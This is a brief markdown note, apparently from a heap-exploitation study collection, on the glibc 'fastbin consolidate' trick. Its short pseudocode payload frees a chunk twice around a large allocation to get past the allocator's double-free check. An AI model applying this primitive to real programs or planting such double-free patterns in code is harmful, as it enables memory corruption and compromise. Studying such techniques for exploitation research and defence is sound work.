# Heap Consolidate

## Case - 1 fastbin consolidate
### Glibc version - latest
### payload
```
a = malloc(0x40)
b = malloc(0x40)
free(a) /* a -> fastbin, prev_in_use bit in chunk b equals 1 */
c = malloc(0x400) /* a -> small bin, prev_in_use bit in chunk b equals 0 */
free(a) /* fastbin & small bin, bypass double-free check*/
malloc(0x40) /* prev_in_use bit of chunk still equals 0 */
```

